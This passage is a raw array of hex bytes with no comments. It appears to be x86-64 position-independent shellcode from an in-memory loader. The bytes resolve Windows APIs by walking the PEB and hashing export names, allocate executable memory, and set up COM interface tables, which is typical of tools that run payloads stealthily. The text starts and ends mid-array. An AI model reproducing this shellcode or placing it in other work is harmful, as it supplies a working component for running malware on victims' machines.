0x4d, 0x85, 0xff, 0x75, 0x15, \n  0x8b, 0xd9, 0xff, 0xd2, 0x48, 0x8b, 0xc8, 0x44, 0x8b, 0xc3, 0x41, 0x8b, \n  0xd4, 0xff, 0x97, 0xc8, 0x00, 0x00, 0x00, 0xeb, 0x1c, 0x8b, 0x9d, 0xc0, \n  0x02, 0x00, 0x00, 0x03, 0xd9, 0xff, 0xd2, 0x48, 0x8b, 0xc8, 0x44, 0x8b, \n  0xcb, 0x4d, 0x8b, 0xc7, 0x41, 0x8b, 0xd4, 0xff, 0x97, 0xd0, 0x00, 0x00, \n  0x00, 0x33, 0xdb, 0x4c, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x1f, \n  0x01, 0x00, 0x00, 0x8b, 0x95, 0xc0, 0x02, 0x00, 0x00, 0x4c, 0x8d, 0x4c, \n  0x24, 0x40, 0x44, 0x8b, 0x85, 0xc8, 0x02, 0x00, 0x00, 0x48, 0x03, 0xd0, \n  0x49, 0x8b, 0xce, 0xff, 0x97, 0x68, 0x01, 0x00, 0x00, 0x8b, 0x85, 0xc8, \n  0x02, 0x00, 0x00, 0x48, 0x8d, 0x95, 0xc8, 0x02, 0x00, 0x00, 0x01, 0x85, \n  0xc0, 0x02, 0x00, 0x00, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x49, 0x8b, \n  0xce, 0xff, 0x97, 0x78, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, 0x5f, \n  0xff, 0xff, 0xff, 0x4c, 0x8d, 0xaf, 0xd8, 0x00, 0x00, 0x00, 0x4d, 0x85, \n  0xff, 0x0f, 0x84, 0xc2, 0x00, 0x00, 0x00, 0xeb, 0x5c, 0x8b, 0x85, 0xc0, \n  0x02, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0xb7, 0x00, 0x00, 0x00, 0x4c, \n  0x8d, 0xaf, 0xd8, 0x00, 0x00, 0x00, 0x8b, 0xd8, 0x41, 0xff, 0x55, 0x00, \n  0x41, 0xbc, 0x01, 0x00, 0x00, 0x00, 0x44, 0x8b, 0xc3, 0x48, 0x8b, 0xc8, \n  0x41, 0x8b, 0xd4, 0xff, 0x97, 0xc8, 0x00, 0x00, 0x00, 0x33, 0xdb, 0x4c, \n  0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x82, 0x00, 0x00, 0x00, 0x44, \n  0x8b, 0x85, 0xc0, 0x02, 0x00, 0x00, 0x4c, 0x8d, 0x4c, 0x24, 0x40, 0x48, \n  0x8b, 0xd0, 0x89, 0x5c, 0x24, 0x40, 0x49, 0x8b, 0xce, 0xff, 0x97, 0x68, \n  0x01, 0x00, 0x00, 0x8b, 0xf0, 0x8b, 0x85, 0xc0, 0x02, 0x00, 0x00, 0x85, \n  0xc0, 0x74, 0x5a, 0x33, 0xc9, 0x8b, 0xd0, 0x41, 0xb8, 0x00, 0x30, 0x00, \n  0x00, 0x44, 0x8d, 0x49, 0x04, 0xff, 0x57, 0x48, 0x48, 0x89, 0x87, 0x60, \n  0x0d, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x17, 0x44, 0x8b, 0x85, 0xc0, \n  0x02, 0x00, 0x00, 0x49, 0x8b, 0xd7, 0x48, 0x8b, 0xc8, 0xe8, 0x2a, 0x2b, \n  0x00, 0x00, 0x41, 0x8b, 0xf4, 0xeb, 0x02, 0x8b, 0xf3, 0x44, 0x8b, 0x85, \n  0xc0, 0x02, 0x00, 0x00, 0x33, 0xd2, 0x49, 0x8b, 0xcf, 0xe8, 0x32, 0x2b, \n  0x00, 0x00, 0x41, 0xff, 0x55, 0x00, 0x4d, 0x8b, 0xc7, 0x41, 0x8b, 0xd4, \n  0x48, 0x8b, 0xc8, 0xff, 0x97, 0xe0, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0x6c, \n  0x24, 0x48, 0x49, 0x8b, 0xce, 0xff, 0x97, 0x70, 0x01, 0x00, 0x00, 0x49, \n  0x8b, 0xcd, 0xff, 0x97, 0x70, 0x01, 0x00, 0x00, 0x45, 0x33, 0xf6, 0x48, \n  0x8b, 0x4c, 0x24, 0x58, 0xff, 0x97, 0x70, 0x01, 0x00, 0x00, 0x85, 0xf6, \n  0x74, 0x48, 0x83, 0xbf, 0x34, 0x02, 0x00, 0x00, 0x03, 0x75, 0x3f, 0x48, \n  0x8b, 0x9f, 0x60, 0x0d, 0x00, 0x00, 0x48, 0x8d, 0x97, 0x48, 0x0d, 0x00, \n  0x00, 0x44, 0x8b, 0x8f, 0x58, 0x0d, 0x00, 0x00, 0x48, 0x8d, 0x8f, 0x38, \n  0x0d, 0x00, 0x00, 0x4c, 0x8b, 0xc3, 0xe8, 0xdd, 0x26, 0x00, 0x00, 0x48, \n  0x8b, 0x57, 0x28, 0x48, 0x8d, 0x8f, 0x2c, 0x0c, 0x00, 0x00, 0xe8, 0x8d, \n  0x25, 0x00, 0x00, 0x48, 0x3b, 0x83, 0x18, 0x05, 0x00, 0x00, 0x41, 0x0f, \n  0x45, 0xf6, 0x8b, 0xc6, 0xeb, 0x02, 0x33, 0xc0, 0x48, 0x81, 0xc4, 0x78, \n  0x03, 0x00, 0x00, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, \n  0x5e, 0x5b, 0x5d, 0xc3, 0x48, 0x8b, 0xc4, 0x4c, 0x89, 0x48, 0x20, 0x4c, \n  0x89, 0x40, 0x18, 0x48, 0x89, 0x48, 0x08, 0x55, 0x53, 0x56, 0x57, 0x41, \n  0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0xa8, 0xb8, 0xfe, \n  0xff, 0xff, 0x48, 0x81, 0xec, 0x08, 0x02, 0x00, 0x00, 0x4c, 0x63, 0x72, \n  0x3c, 0x48, 0x8b, 0xda, 0x41, 0x8b, 0x84, 0x16, 0x88, 0x00, 0x00, 0x00, \n  0x85, 0xc0, 0x0f, 0x84, 0x97, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x3c, 0x02, \n  0x8b, 0x77, 0x18, 0x85, 0xf6, 0x0f, 0x84, 0x88, 0x00, 0x00, 0x00, 0x44, \n  0x8b, 0x47, 0x0c, 0x33, 0xc9, 0x8b, 0x47, 0x20, 0x4c, 0x03, 0xc2, 0x44, \n  0x8b, 0x67, 0x1c, 0x48, 0x03, 0xc2, 0x44, 0x8b, 0x6f, 0x24, 0x4c, 0x03, \n  0xe2, 0x48, 0x89, 0x85, 0x58, 0x01, 0x00, 0x00, 0x4c, 0x03, 0xea, 0x41, \n  0x8a, 0x00, 0x84, 0xc0, 0x74, 0x14, 0x33, 0xd2, 0xff, 0xc1, 0x0c, 0x20, \n  0x88, 0x44, 0x15, 0xf0, 0x8b, 0xd1, 0x42, 0x8a, 0x04, 0x01, 0x84, 0xc0, \n  0x75, 0xee, 0xc6, 0x44, 0x0d, 0xf0, 0x00, 0x49, 0x8b, 0xd1, 0x48, 0x8d, \n  0x4d, 0xf0, 0xe8, 0xc9, 0x24, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, \n  0x48, 0x8b, 0x85, 0x58, 0x01, 0x00, 0x00, 0x8d, 0x4e, 0xff, 0x48, 0x8b, \n  0x95, 0x68, 0x01, 0x00, 0x00, 0x8b, 0xf1, 0x44, 0x8b, 0xf9, 0x8b, 0x0c, \n  0x88, 0x48, 0x03, 0xcb, 0xe8, 0xa3, 0x24, 0x00, 0x00, 0x48, 0x33, 0x44, \n  0x24, 0x20, 0x48, 0x3b, 0x85, 0x60, 0x01, 0x00, 0x00, 0x74, 0x1a, 0x85, \n  0xf6, 0x75, 0xcd, 0x33, 0xc0, 0x48, 0x81, 0xc4, 0x08, 0x02, 0x00, 0x00, \n  0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0x5d, \n  0xc3, 0x43, 0x0f, 0xb7, 0x44, 0x7d, 0x00, 0x45, 0x8b, 0x04, 0x84, 0x4c, \n  0x03, 0xc3, 0x4c, 0x3b, 0xc7, 0x0f, 0x82, 0xaa, 0x00, 0x00, 0x00, 0x41, \n  0x8b, 0x84, 0x1e, 0x8c, 0x00, 0x00, 0x00, 0x48, 0x03, 0xc7, 0x4c, 0x3b, \n  0xc0, 0x0f, 0x83, 0x96, 0x00, 0x00, 0x00, 0x45, 0x33, 0xd2, 0x45, 0x8b, \n  0xca, 0x45, 0x38, 0x10, 0x74, 0x1f, 0x41, 0x83, 0xf9, 0x3c, 0x73, 0x19, \n  0x41, 0x8b, 0xc1, 0x42, 0x8a, 0x0c, 0x00, 0x88, 0x4c, 0x04, 0x30, 0x80, \n  0xf9, 0x2e, 0x74, 0x09, 0x41, 0xff, 0xc1, 0x47, 0x38, 0x14, 0x01, 0x75, \n  0xe1, 0x41, 0x8d, 0x41, 0x01, 0x8b, 0xd0, 0xc6, 0x44, 0x04, 0x30, 0x64, \n  0x41, 0x8d, 0x41, 0x02, 0xc6, 0x44, 0x04, 0x30, 0x6c, 0x41, 0x8d, 0x41, \n  0x03, 0xc6, 0x44, 0x04, 0x30, 0x6c, 0x41, 0x8d, 0x41, 0x04, 0x4e, 0x8d, \n  0x0c, 0x02, 0x44, 0x88, 0x54, 0x04, 0x30, 0x41, 0x8b, 0xd2, 0x45, 0x38, \n  0x11, 0x74, 0x17, 0x83, 0xfa, 0x7f, 0x73, 0x12, 0x8b, 0xca, 0xff, 0xc2, \n  0x42, 0x8a, 0x04, 0x09, 0x88, 0x44, 0x0c, 0x70, 0x46, 0x38, 0x14, 0x0a, \n  0x75, 0xe9, 0x48, 0x8b, 0x8d, 0x50, 0x01, 0x00, 0x00, 0x4c, 0x8d, 0x4c, \n  0x24, 0x70, 0x8b, 0xc2, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0x48, 0x8b, 0xd3, \n  0x44, 0x88, 0x54, 0x04, 0x70, 0xe8, 0x0e, 0x00, 0x00, 0x00, 0x4c, 0x8b, \n  0xc0, 0x49, 0x8b, 0xc0, 0xe9, 0x24, 0xff, 0xff, 0xff, 0xcc, 0xcc, 0xcc, \n  0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, \n  0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, \n  0x20, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x45, 0x33, \n  0xdb, 0x49, 0x8b, 0xf1, 0x4d, 0x8b, 0xf0, 0x48, 0x8b, 0xea, 0x48, 0x8b, \n  0xf9, 0x4c, 0x8b, 0x50, 0x60, 0x49, 0x8b, 0x42, 0x18, 0x48, 0x8b, 0x58, \n  0x10, 0x4c, 0x39, 0x5b, 0x30, 0x74, 0x2e, 0x4d, 0x85, 0xdb, 0x75, 0x4a, \n  0x48, 0x8b, 0x53, 0x30, 0x48, 0x3b, 0xd5, 0x74, 0x11, 0x45, 0x33, 0xc9, \n  0x4c, 0x8b, 0xc6, 0x48, 0x8b, 0xcf, 0xe8, 0x35, 0x21, 0x00, 0x00, 0x4c, \n  0x8b, 0xd8, 0x48, 0x8b, 0x1b, 0x48, 0x83, 0x7b, 0x30, 0x00, 0x75, 0xd7, \n  0x4d, 0x85, 0xdb, 0x75, 0x21, 0x49, 0x8b, 0xd6, 0x48, 0x8b, 0xcf, 0xe8, \n  0x30, 0x20, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x0e, 0x48, 0x8b, 0xd6, \n  0x48, 0x8b, 0xc8, 0xff, 0x57, 0x38, 0x4c, 0x8b, 0xd8, 0xeb, 0x03, 0x45, \n  0x33, 0xdb, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x49, 0x8b, 0xc3, 0x48, 0x8b, \n  0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x8b, 0x7c, 0x24, \n  0x48, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3, 0x40, 0x53, 0x48, 0x83, \n  0xec, 0x20, 0x48, 0x8b, 0x4a, 0x30, 0x48, 0x8b, 0xda, 0x48, 0x85, 0xc9, \n  0x74, 0x0b, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x10, 0x48, 0x83, 0x63, 0x30, \n  0x00, 0x48, 0x8b, 0x4b, 0x38, 0x48, 0x85, 0xc9, 0x74, 0x0b, 0x48, 0x8b, \n  0x01, 0xff, 0x50, 0x10, 0x48, 0x83, 0x63, 0x38, 0x00, 0x48, 0x8b, 0x4b, \n  0x28, 0x48, 0x85, 0xc9, 0x74, 0x0b, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x10, \n  0x48, 0x83, 0x63, 0x28, 0x00, 0x48, 0x8b, 0x4b, 0x10, 0x48, 0x85, 0xc9, \n  0x74, 0x26, 0x48, 0x8b, 0x01, 0x48, 0x8b, 0x53, 0x20, 0xff, 0x90, 0xa0, \n  0x00, 0x00, 0x00, 0x48, 0x8b, 0x4b, 0x10, 0x48, 0x8b, 0x01, 0xff, 0x50, \n  0x58, 0x48, 0x8b, 0x4b, 0x10, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x10, 0x48, \n  0x83, 0x63, 0x10, 0x00, 0x48, 0x8b, 0x4b, 0x20, 0x48, 0x85, 0xc9, 0x74, \n  0x0b, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x10, 0x48, 0x83, 0x63, 0x20, 0x00, \n  0x48, 0x8b, 0x4b, 0x18, 0x48, 0x85, 0xc9, 0x74, 0x0b, 0x48, 0x8b, 0x01, \n  0xff, 0x50, 0x10, 0x48, 0x83, 0x63, 0x18, 0x00, 0x48, 0x8b, 0x4b, 0x08, \n  0x48, 0x85, 0xc9, 0x74, 0x0b, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x10, 0x48, \n  0x83, 0x63, 0x08, 0x00, 0x48, 0x8b, 0x0b, 0x48, 0x85, 0xc9, 0x74, 0x0a, \n  0x48, 0x8b, 0x01, 0xff, 0x50, 0x10, 0x48, 0x83, 0x23, 0x00, 0x48, 0x83, \n  0xc4, 0x20, 0x5b, 0xc3, 0xf0, 0xff, 0x41, 0x20, 0x8b, 0x41, 0x20, 0xc3, \n  0x48, 0x8b, 0x49, 0x10, 0x45, 0x8b, 0xd1, 0x4c, 0x8b, 0x4c, 0x24, 0x30, \n  0x49, 0x8b, 0xd0, 0x45, 0x8b, 0xc2, 0x48, 0x8b, 0x01, 0x48, 0xff, 0x60, \n  0x50, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x57, 0x48, 0x83, \n  0xec, 0x20, 0x49, 0x8b, 0xd9, 0x48, 0x8b, 0xf9, 0x4d, 0x85, 0xc9, 0x75, \n  0x07, 0xb8, 0x03, 0x40, 0x00, 0x80, 0xeb, 0x13, 0x48, 0x8b, 0x49, 0x10, \n  0x48, 0x8b, 0x01, 0xff, 0x50, 0x08, 0x48, 0x8b, 0x47, 0x10, 0x48, 0x89, \n  0x03, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, \n  0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x85, 0xd2, 0x75, 0x06, 0xb8, 0x03, 0x40, \n  0x00, 0x80, 0xc3, 0xc7, 0x02, 0x01, 0x00, 0x00, 0x00, 0x33, 0xc0, 0xc3, \n  0x48, 0x83, 0xec, 0x48, 0x48, 0x8b, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, \n  0x4c, 0x8b, 0xd9, 0x48, 0x8b, 0x49, 0x10, 0x44, 0x8b, 0xc2, 0x44, 0x0f, \n  0xb7, 0x4c, 0x24, 0x70, 0x49, 0x8b, 0xd3, 0x48, 0x89, 0x44, 0x24, 0x38, \n  0x48, 0x8b, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0x11, 0x48, \n  0x89, 0x44, 0x24, 0x30, 0x48, 0x8b, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, \n  0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8b, 0x44, 0x24, 0x78, 0x48, 0x89, \n  0x44, 0x24, 0x20, 0x41, 0xff, 0x52, 0x58, 0x48, 0x83, 0xc4, 0x48, 0xc3, \n  0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, \n  0x81, 0xec, 0x40, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x02, 0x48, 0x8b, 0xf9, \n  0x48, 0x8d, 0x0d, 0x31, 0x02, 0x00, 0x00, 0x48, 0x8b, 0xda, 0x48, 0x89, \n  0x08, 0x48, 0x8d, 0x0d, 0x0c, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, \n  0x89, 0x48, 0x08, 0x48, 0x8d, 0x0d, 0xa6, 0x02, 0x00, 0x00, 0x48, 0x8b, \n  0x02, 0x48, 0x89, 0x48, 0x10, 0x48, 0x8d, 0x0d, 0x50, 0xff, 0xff, 0xff, \n  0x48, 0x8b, 0x02, 0x48, 0x89, 0x48, 0x18, 0x48, 0x8d, 0x0d, 0x06, 0xff, \n  0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x48, 0x20, 0x48, 0x8d, 0x0d, \n  0xdc, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x48, 0x28, 0x48, \n  0x8d, 0x0d, 0x3a, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x48, \n  0x30, 0x48, 0x8d, 0x0d, 0xa0, 0xf3, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, \n  0x89, 0x48, 0x38, 0x48, 0x8d, 0x0d, 0x26, 0xf3, 0xff, 0xff, 0x48, 0x8b, \n  0x02, 0x48, 0x89, 0x48, 0x40, 0x48, 0x8d, 0x0d, 0x18, 0xf3, 0xff, 0xff, \n  0x48, 0x8b, 0x02, 0x48, 0x89, 0x48, 0x48, 0x48, 0x8d, 0x0d, 0x0a, 0xf3, \n  0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x48, 0x50, 0x48, 0x8d, 0x0d, \n  0xfc, 0xf2, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x48, 0x58, 0x48, \n  0x8d, 0x0d, 0xee, 0xf2, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x48, \n  0x60, 0x48, 0x8d, 0x0d, 0xec, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x02, 0x48, \n  0x89, 0x48, 0x68, 0x48, 0x8d, 0x0d, 0xd2, 0xf2, 0xff, 0xff, 0x48, 0x8b, \n  0x02, 0x48, 0x89, 0x48, 0x70, 0x48, 0x8d, 0x0d, 0xc4, 0xf2, 0xff, 0xff, \n  0x48, 0x8b, 0x02, 0x48, 0x89, 0x48, 0x78, 0x48, 0x8d, 0x0d, 0xb6, 0xf2, \n  0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x88, 0x80, 0x00, 0x00, 0x00, \n  0x48, 0x8d, 0x0d, 0xa5, 0xf2, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, \n  0x88, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x94, 0xf2, 0xff, 0xff, \n  0x48, 0x8b, 0x02, 0x48, 0x89, 0x88, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8d, \n  0x0d, 0x83, 0xf2, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x88, 0x98, \n  0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x72, 0xf2, 0xff, 0xff, 0x48, 0x8b, \n  0x02, 0x48, 0x89, 0x88, 0xa0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x61, \n  0xf2, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x88, 0xa8, 0x00, 0x00, \n  0x00, 0x48, 0x8d, 0x0d, 0x50, 0xf2, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, \n  0x89, 0x88, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x3f, 0xf2, 0xff, \n  0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x88, 0xb8, 0x00, 0x00, 0x00, 0x48, \n  0x8d, 0x0d, 0x2e, 0xf2, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x88, \n  0xc0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x55, 0x01, 0x00, 0x00, 0x48, \n  0x8b, 0x02, 0x48, 0x89, 0x88, 0xc8, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x02, \n  0x48, 0x8d, 0x0d, 0x09, 0xf2, 0xff, 0xff, 0xc7, 0x44, 0x24, 0x28, 0x00, \n  0x01, 0x00, 0x00, 0x48, 0x89, 0x88, 0xd0, 0x00, 0x00, 0x00, 0x4c, 0x8d, \n  0x87, 0x19, 0x06, 0x00, 0x00, 0x48, 0x8b, 0x02, 0x48, 0x8d, 0x0d, 0xe9, \n  0xf1, 0xff, 0xff, 0x41, 0x83, 0xc9, 0xff, 0x48, 0x89, 0x88, 0xd8, 0x00, \n  0x00, 0x00, 0x48, 0x8d, 0x0d, 0xd7, 0xf1, 0xff, 0xff, 0x48, 0x8b, 0x02, \n  0x48, 0x89, 0x88, 0xe0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0xc6, 0xf1, \n  0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x88, 0xe8, 0x00, 0x00, 0x00, \n  0x48, 0x8d, 0x44, 0x24, 0x30, 0x83, 0x62, 0x20, 0x00, 0x33, 0xc9, 0x48, \n  0x89, 0x7a, 0x28, 0x33, 0xd2, 0x48, 0x89, 0x44, 0x24, 0x20, 0xff, 0x57, \n  0x70, 0x48, 0x8d, 0x53, 0x08, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0xff, 0x97, \n  0x40, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x75, 0x15, 0x48, 0x8b, 0x4b, 0x08, \n  0x4c, 0x8d, 0x43, 0x10, 0x48, 0x8d, 0x97, 0xc0, 0x08, 0x00, 0x00, 0x48, \n  0x8b, 0x01, 0xff, 0x50, 0x30, 0x4c, 0x8d, 0x9c, 0x24, 0x40, 0x02, 0x00, \n  0x00, 0x49, 0x8b, 0x5b, 0x10, 0x49, 0x8b, 0x73, 0x18, 0x49, 0x8b, 0xe3, \n  0x5f, 0xc3, 0xcc, 0xcc, 0x4c, 0x8b, 0xc9, 0x4d, 0x85, 0xc0, 0x75, 0x06, \n  0xb8, 0x03, 0x40, 0x00, 0x80, 0xc3, 0x48, 0x8b, 0x49, 0x28, 0x48, 0x8b, \n  0x81, 0x30, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x02, 0x75, 0x0d, 0x48, 0x8b, \n  0x81, 0x38, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x42, 0x08, 0x74, 0x32, 0x48, \n  0x8b, 0x81, 0x40, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x02, 0x75, 0x0d, 0x48, \n  0x8b, 0x81, 0x48, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x42, 0x08, 0x74, 0x19, \n  0x48, 0x8b, 0x81, 0xc0, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x02, 0x75, 0x13, \n  0x48, 0x8b, 0x81, 0xc8, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x42, 0x08, 0x75, \n  0x06, 0x4d, 0x89, 0x08, 0x33, 0xc0, 0xc3, 0x49, 0x83, 0x20, 0x00, 0xb8, \n  0x02, 0x40, 0x00, 0x80, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, \n  0x48, 0x8b, 0x49, 0x18, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0xba, 0xfd, \n  0xff, 0xff, 0xff, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x70, 0x33, 0xc0, 0x48, \n  0x83, 0xc4, 0x28, 0xc3, 0x83, 0xc8, 0xff, 0xf0, 0x0f, 0xc1, 0x41, 0x20, \n  0xff, 0xc8, 0xc3, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0x41, 0x28, \n  0x8b, 0xca, 0xff, 0x50, 0x68, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, \n  0x48, 0x89, 0x5c, 0x24, 0x08, 0x57, 0x48, 0x81, 0xec, 0xa0, 0x00, 0x00, \n  0x00, 0x48, 0x8b, 0xfa, 0x48, 0x8d, 0x99, 0x70, 0x04, 0x00, 0x00, 0x8a, \n  0x03, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x84, 0xc0, 0x74, 0x56, 0x48, \n  0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb, 0x48, 0x2b, 0xd3, 0x3c, 0x3b, \n  0x74, 0x1b, 0x49, 0x81, 0xf8, 0x80, 0x00, 0x00, 0x00, 0x7d, 0x12, 0x88, \n  0x04, 0x0a, 0x41, 0xff, 0xc1, 0x48, 0xff, 0xc1, 0x49, 0xff, 0xc0, 0x8a, \n  0x01, 0x84, 0xc0, 0x75, 0xe1, 0x4d, 0x85, 0xc0, 0x74, 0x27, 0x49, 0x63, \n  0xc9, 0x48, 0x8b, 0xd7, 0x48, 0xff, 0xc1, 0x42, 0xc6, 0x44, 0x04, 0x20, \n  0x00, 0x48, 0x03, 0xd9, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0xe8, 0x4a, 0x23, \n  0x00, 0x00, 0x85, 0xc0, 0x75, 0xa5, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xeb, \n  0x02, 0x33, 0xc0, 0x48, 0x8b, 0x9c, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x48, \n  0x81, 0xc4, 0xa0, 0x00, 0x00, 0x00, 0x5f, 0xc3, 0x40, 0x53, 0x48, 0x83, \n  0xec, 0x50, 0x33, 0xdb, 0x48, 0x8b, 0xc2, 0x4c, 0x8b, 0xc9, 0x48, 0x85, \n  0xd2, 0x74, 0x37, 0x44, 0x8d, 0x43, 0x30, 0x48, 0x8b, 0xc8, 0x48, 0x8d, \n  0x54, 0x24, 0x20, 0x41, 0xff, 0x51, 0x58, 0x83, 0xf8, 0x30, 0x75, 0x22, \n  0x81, 0x7c, 0x24, 0x40, 0x00, 0x10, 0x00, 0x00, 0x75, 0x14, 0x81, 0x7c, \n  0x24, 0x48, 0x00, 0x00, 0x02, 0x00, 0x75, 0x0a, 0x83, 0x7c, 0x24, 0x44, \n  0x04, 0x75, 0x03, 0x8d, 0x58, 0xd1, 0x8b, 0xc3, 0xeb, 0x02, 0x33, 0xc0, \n  0x48, 0x83, 0xc4, 0x50, 0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, \n  0x10, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x56, 0x57, 0x41, 0x54, 0x41, 0x56, \n  0x41, 0x57, 0x48, 0x81, 0xec, 0x30, 0x02, 0x00, 0x00, 0x4c, 0x8b, 0x89, \n  0xa0, 0x01, 0x00, 0x00, 0x33, 0xc0, 0x45, 0x33, 0xe4, 0x49, 0x8b, 0xf0, \n  0x48, 0x8b, 0xea, 0x48, 0x8b, 0xf9, 0x41, 0xbf, 0x00, 0x01, 0x00, 0x00, \n  0x4d, 0x85, 0xc9, 0x0f, 0x84, 0x9a, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x91, \n  0x60, 0x08, 0x00, 0x00, 0x48, 0x81, 0xc1, 0x50, 0x08, 0x00, 0x00, 0x41, \n  0xff, 0xd1, 0x85, 0xc0, 0x0f, 0x88, 0xba, 0x00, 0x00, 0x00, 0x48, 0x8d, \n  0x44, 0x24, 0x30, 0x44, 0x89, 0x7c, 0x24, 0x28, 0x4c, 0x8d, 0x45, 0x0c, \n  0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0x83, 0xc9, 0xff, 0x33, 0xd2, 0x33, \n  0xc9, 0xff, 0x57, 0x70, 0x48, 0x8b, 0x0e, 0x48, 0x8d, 0x5e, 0x08, 0x4c, \n  0x8d, 0x87, 0x70, 0x08, 0x00, 0x00, 0x4c, 0x8b, 0xcb, 0x48, 0x8d, 0x54, \n  0x24, 0x30, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x18, 0x85, 0xc0, 0x78, 0x3c, \n  0x48, 0x8b, 0x0b, 0x48, 0x8d, 0x94, 0x24, 0x60, 0x02, 0x00, 0x00, 0x48, \n  0x8b, 0x01, 0xff, 0x50, 0x50, 0x85, 0xc0, 0x78, 0x37, 0x44, 0x39, 0xa4, \n  0x24, 0x60, 0x02, 0x00, 0x00, 0x74, 0x20, 0x48, 0x8b, 0x0b, 0x4c, 0x8d, \n  0x4e, 0x10, 0x4c, 0x8d, 0x87, 0x90, 0x08, 0x00, 0x00, 0x48, 0x8d, 0x97, \n  0x80, 0x08, 0x00, 0x00, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x48, 0xeb, 0x03, \n  0x4c, 0x21, 0x23, 0x85, 0xc0, 0x78, 0x09, 0x4c, 0x39, 0xa7, 0xa0, 0x01, \n  0x00, 0x00, 0x75, 0x21, 0x48, 0x8d, 0x46, 0x10, 0x33, 0xd2, 0x4c, 